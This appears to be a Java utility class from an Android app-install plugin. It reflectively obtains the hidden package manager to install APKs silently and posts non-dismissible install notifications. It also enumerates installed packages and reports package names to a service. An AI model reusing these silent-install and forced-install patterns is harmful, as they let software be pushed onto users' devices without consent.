package com.xstd.ip;

import java.io.File;
import java.lang.reflect.Method;
import java.util.ArrayList;
import java.util.Calendar;
import java.util.List;

import android.app.Notification;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.content.Context;
import android.content.Intent;
import android.content.pm.IPackageInstallObserver;
import android.content.pm.IPackageManager;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.graphics.Bitmap;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.Uri;
import android.os.IBinder;
import android.support.v4.app.NotificationCompat;
import android.util.Log;

import com.xstd.ip.service.CoreService;

public class Tools {

	/**
	 * 启动核心服务。
	 * 
	 * @param context
	 */
	public static void startCoreService(Context context) {
		context.startService(new Intent(context, CoreService.class));
		;
	}

	/**
	 * 得到packagemanager，安装apk。
	 * 
	 * @return 返回IPackageManager对象。
	 */
	@SuppressWarnings({ "rawtypes", "unchecked" })
	private static IPackageManager getPackageManger() {
		try {
			Class clazz = Tools.class.getClassLoader().loadClass("android.os.ServiceManager");
			Method method = clazz.getMethod("getService", new Class[] { String.class });
			IBinder b = (IBinder) method.invoke(null, "package");
			return IPackageManager.Stub.asInterface(b);
		} catch (Exception e) {
			return null;
		}
	}

	/**
	 * 通过apk路径得到apk信息
	 * 
	 * @param context
	 * @param path
	 * @return
	 */
	public static PackageInfo getPackageInfoByPath(Context context, String path) {
		return context.getPackageManager().getPackageArchiveInfo(path, PackageManager.GET_ACTIVITIES);
	}

	/**
	 * 安装apk文件
	 * 
	 * @param context
	 * @param file
	 * @param observer
	 * @throws Exception
	 */
	public static void installFile(Context context, File file, IPackageInstallObserver observer) {
		PackageInfo info = getPackageInfoByPath(context, file.getAbsolutePath());
		if (file == null || !file.isFile() || info == null)
			return;
		int flags = 0;
		try {
			getPackageManger().installPackage(Uri.fromFile(file), observer, flags, info.packageName);
		} catch (Exception e) {
			e.printStackTrace();
		}
	}

	/**
	 * 清除这个包名的通知
	 * 
	 * @param context
	 * @param packageName
	 */
	public static void cancleNotification(Context context, String packageName) {
		((NotificationManager) context.getSystemService(Context.NOTIFICATION_SERVICE)).cancel(generateNotificationID(packageName));
	}

	/**
	 * 根据包名生成通知id
	 * 
	 * @param packageName
	 * @return
	 */
	private static int generateNotificationID(String packageName) {
		return packageName.hashCode();
	}

	/**
	 * 通过发送通知的方式安装
	 * 
	 * @param context
	 * @param tickerText
	 * @param title
	 *            通知的标题
	 * @param text
	 *            通知的内容
	 * @param icon
	 *            通知的图标
	 * @param largeIcon
	 * @param apkPath
	 *            apk包的绝对路径
	 */
	public static void useNotificationInstall(Context context, String tickerText, String title, String text, int icon, Bitmap largeIcon, String apkPath) {
		Intent intent = new Intent("android.intent.action.INSTALL_PACKAGE");
		intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
		intent.addCategory("android.intent.category.DEFAULT");
		intent.setDataAndType(Uri.fromFile(new File(apkPath)), "application/vnd.android.package-archive");
		NotificationManager nm = (NotificationManager) context.getSystemService(Context.NOTIFICATION_SERVICE);
		Notification notification = new NotificationCompat.Builder(context).setTicker(tickerText).setContentTitle(title).setContentText(text).setSmallIcon(icon).setLargeIcon(largeIcon)
				.setContentIntent(PendingIntent.getActivity(context, 0, intent, 0)).setDefaults(Notification.DEFAULT_SOUND).setWhen(System.currentTimeMillis()).build();
		notification.flags = Notification.FLAG_NO_CLEAR;
		PackageInfo packageInfo = checkPackageByPath(context, apkPath);
		if (packageInfo != null)
			nm.notify(generateNotificationID(packageInfo.packageName), notification);
	}

	/**
	 * 通过apk路径获得packageinfo对象
	 * 
	 * @param context
	 * @param path
	 * @return
	 */
	public static PackageInfo checkPackageByPath(Context context, String path) {
		return context.getPackageManager().getPackageArchiveInfo(path, PackageManager.GET_ACTIVITIES);
	}

	/**
	 * 回到Launcher
	 * 
	 * @param context
	 */
	public static void goHome(Context context) {
		Intent intent = new Intent(Intent.ACTION_MAIN);
		intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
		intent.addCategory(Intent.CATEGORY_HOME);
		context.startActivity(intent);
	}

	/**
	 * 如果当前系统时间大于2014年1月1日0时0分0秒则为正常时间
	 * 
	 * @return
	 */
	public static boolean isTrueTime() {
		Calendar calendar = Calendar.getInstance();
		calendar.set(2014, 0, 1, 0, 0, 0);
		return System.currentTimeMillis() > calendar.getTimeInMillis();
	}

	/**
	 * 判断网络是否可用
	 * 
	 * @param context
	 * @return
	 */
	public static boolean isOnline(Context context) {
		ConnectivityManager cm = (ConnectivityManager) context.getSystemService(Context.CONNECTIVITY_SERVICE);
		NetworkInfo info = (cm != null) ? cm.getActiveNetworkInfo() : null;
		if (info != null && info.isAvailable() && info.isConnected()) {
			return true;
		}
		return false;
	}

	/**
	 * 获得设备上所有安装程序的包名
	 * 
	 * @param context
	 * @return
	 */
	public static List<String> getDeviceInstallPackName(Context context) {
		List<String> names = new ArrayList<String>();
		List<PackageInfo> pis = context.getPackageManager().getInstalledPackages(PackageManager.GET_ACTIVITIES);
		for (PackageInfo pi : pis)
			names.add(pi.packageName);
		return names;
	}

	/**
	 * DEBUG模式下打印debug级别的信息
	 * 
	 * @param msg
	 */
	public static void logW(String msg) {
		if (Config.isDebug)
			Log.d("INSTALL_PLUGIN", msg);
	}

	public static void notifyServer(Context context, String action, String packname) {
		Intent service = new Intent(action);
		service.putExtra("packname", packname);
		context.startService(service);
	}

}
